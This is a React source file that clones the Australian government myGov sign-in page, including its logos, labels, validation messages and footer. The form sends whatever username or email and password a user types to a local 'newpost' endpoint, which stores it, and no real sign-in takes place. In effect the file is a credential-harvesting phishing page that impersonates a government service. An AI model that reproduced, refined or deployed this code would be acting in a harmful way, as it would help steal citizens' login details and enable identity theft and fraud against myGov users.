import './App.css';
import AllPost from './features/post/AllPost';
import { useState } from 'react';
import * as yup from 'yup'
import axios from 'axios'
import { useFormik } from 'formik';
import ReportGmailerrorredOutlinedIcon from '@mui/icons-material/ReportGmailerrorredOutlined';
import { Box } from '@mui/material';

function App() {

  const [toggle, setToggle] = useState('Show')
  const [error, setError] = useState('')
    const [isClicked, setIsClicked] = useState(false)

  const passwordToggle = () => {
    var x = document.getElementById("text");
    //var y = document.getElementById("text");
    if (x.type === "password") {
      x.type = "text";
      setToggle('Hide')
    } else {
      x.type = "password";
      setToggle('Show')

    }
  }

  const formik = useFormik({
    initialValues: {
        id: '',
        password: '',
    },
    onSubmit: (values) => {
      alert('yes')
        //console.log(url);
        //setIsClicked(true)
        axios.post('http://localhost:4000/post/newpost', values).then((result) => {
            if (result.data.status) {
              console.log('save successfully');
                //localStorage.token = result.data.token
                // setTimeout(() => {
                //     navigate('/home')
                // }, 3000)

            } else {
              console.log('error successfully');
                //setError(result.data.message)
                //setIsClicked(false)
            }
        })
    },
    validationSchema: yup.object({
        id: yup.string().required('Enter a valid email address, mobile number or myGov username. A valid myGov username is 2 letters, followed by 6 numbers.').matches(/^(?:\w+|\w+([+\.-]?\w+)*@\w+([\.-]?\w+)*(\.[a-zA-z]{2,4})+)$/).min(8,'Username or email must be at least 8 characters'),
        password: yup.string().required('Enter your current password')
    }),

})
  return (
    <>
      <nav class="uikit-skip-link" aria-label="Skip Links">
        <a class="uikit-skip-link__link" href="#">Skip to main content</a>
      </nav>

      <div class="brand-rainbow">&nbsp;</div>
      <header role="banner" class="mgvEnhanceHeader">
        <section class="wrapper">
          <div class="inner">
            <div class="unauth-grid">
              <div class="unauth-grid-row">
                <a href="#" class="unauth-govt-crest__link">
                  <img id="unauth-govt-crest" src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img" />
                </a>

                <div class="header-links">
                  <a href="#">Help</a>
                </div>
              </div>
            </div>
          </div>
        </section>
      </header>









      <div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
        <div class="unauth">
          <div class="login-grid-container">
            <div class="login-grid-row">
              <div class="login-grid-column">
                <div class="digital-id-login-card-wrapper">
                  <div class="digital-id-main-login-card override">

                    <a data-go-back-link="" class="button-back" href="#">Back</a>













                    <h1>Sign in with myGov</h1>
                    <p class="login-instruction-text">Choose how to sign in from these 2 options</p>
                    <h2 class="text-align-left">Using your myGov sign in details</h2>
                    <form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" onSubmit={formik.handleSubmit} >

                      <div class="input-group">
                        <label class="override" for="userId">Username or email</label>
                        <input id="userId" name="username" class={formik.errors.id?'errorId' : 'text'}
                        onChange={formik.handleChange('id')}
                        onBlur={formik.handleBlur('id')}
                        value={formik.values.id}/>
                      </div>
                    {formik.touched.id ? 
                     <Box><p class="form-helper-message hasError" role="alert" aria-live="polite" id="userId__form-helper-message">{formik.errors.id? <Box sx={{display:'flex',color:'red'}}><ReportGmailerrorredOutlinedIcon />{formik.errors.id}</Box>  :''}</p></Box> : ''
                    }
                      <p class="recovery">
                        <a href="#"
                          class="anchor override">Forgot username</a>
                      </p>

                      <div class="input-group">
                        <label for="password" class="override">Password</label>
                        <div id="password">
                          <input id="text" name="text" type="password" class={formik.errors.password?'errorPassword':''}
                            data-current-password="data-current-password" autocomplete="off"
                            aria-required="true"  onChange={formik.handleChange('password')}
                            onBlur={formik.handleBlur('password')}
                            value={formik.values.password}/>
                          <div id='passwordToggle' className={formik.errors.password?'ux':''} onClick={passwordToggle}>
                            {toggle}
                          </div>
                        </div>
                      </div>
                      {formik.touched.password ? 
                     <Box><p class="form-helper-message hasError" role="alert" aria-live="polite" id="userId__form-helper-message">{formik.errors.password? <Box sx={{display:'flex',color:'red'}}><ReportGmailerrorredOutlinedIcon />{formik.errors.password}</Box>  :''}</p></Box> : ''
                    }
                      <p class="recovery">
                        <a href="#" class="anchor override">Forgot
                          password</a>
                      </p>

                      <div class="button-digital-id-main-container override">
                        <div class="digital-id-button-container">
                          <button type="submit" class="button-main" name="_eventId_login">Sign in</button>
                        </div>
                      </div>

                      <input type="hidden" name="authtype" value="unamepword" />
                      <input type="hidden" name="_csrf" value="f6678688-a280-458b-804d-d0c5ace67e70" />



                      <p class="create-account-text"><a class="create-account-link"
                        href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.</p>







                      <div>
                        <input type="hidden" name="_csrf" value="f6678688-a280-458b-804d-d0c5ace67e70" />
                      </div></form>

                    <div class="hr-word">
                      <div class="draw-circle">
                        or
                      </div>
                    </div>

                    <div class="digital-id-login-card secondary">
                      <div class="button-digital-id-container">
                        <h2 class="text-align-left">Using your myGovID Digital Identity</h2>
                        <div class='digital-id-login-option-container'>
                          <div class='inner-options'>
                            <p class="external-links-zone">
                              What is <a href="#"
                               >Digital Identity</a> and <a
                                  href="#" >myGovID</a>?
                            </p>
                            <a class="button-digital-identity" href="#">Continue with Digital Identity</a>
                            <input type="hidden" value="{flowScope.targetParamDI}" />
                          </div>
                        </div>
                      </div>
                    </div>


                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div></div>





      <footer role="contentinfo">
        <div class="wrapper">
          <div class="inner">

            <section class="footer-list">
              <nav>
                <h2 class="sr-only" aria-label="Footer">Footer</h2>
                <ul class="lower-links">
                  <li>
                    <a  href="#">Terms of use</a>
                  </li>
                  <li>
                    <a  href="#">Privacy and security</a>
                  </li>
                  <li>
                    <a  href="#">Copyright</a>
                  </li>
                  <li>
                    <a  href="#">Accessibility</a>
                  </li>
                </ul>
              </nav>
            </section>
            <div class="footer-lower">
              <section class="footer-lower-logo">
                <a href="#">
                  <img src="https://login.my.gov.au/mygov/content/mgv2/blugov/myGov-cobranded-logo-white.svg"
                    alt="myGov Beta" width="313.17"
                    height="70" role="img" />
                </a>
              </section>

              <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
            </div>




          </div>
        </div>
      </footer>
    </>
  );

}

export default App;
